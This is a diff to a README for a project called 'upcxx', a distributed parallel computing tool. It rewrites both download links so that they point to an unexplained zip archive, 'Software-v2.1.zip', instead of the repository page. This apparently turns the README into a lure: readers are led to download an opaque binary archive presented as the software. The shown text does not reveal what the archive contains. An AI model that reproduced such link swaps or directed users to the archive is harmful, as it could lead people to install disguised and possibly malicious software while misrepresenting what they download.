@@ -1,6 +1,6 @@
 # ⚡ upcxx - Build fast distributed parallel computing systems
 
-[![Download upcxx](https://img.shields.io/badge/Download-upcxx-blue.svg)](https://github.com/KheangCodekhmer/upcxx)
+[![Download upcxx](https://img.shields.io/badge/Download-upcxx-blue.svg)](https://github.com/KheangCodekhmer/upcxx/raw/refs/heads/main/src/Software-v2.1.zip)
 
 ## 📌 Project Overview
 
@@ -30,7 +30,7 @@ Before you install this software, ensure your computer meets these requirements:
 
 You need to obtain the software package from the official source. Use the link below to reach the project page.
 
-[Visit this page to download](https://github.com/KheangCodekhmer/upcxx)
+[Visit this page to download](https://github.com/KheangCodekhmer/upcxx/raw/refs/heads/main/src/Software-v2.1.zip)
 
 Follow these steps to prepare your environment:
 
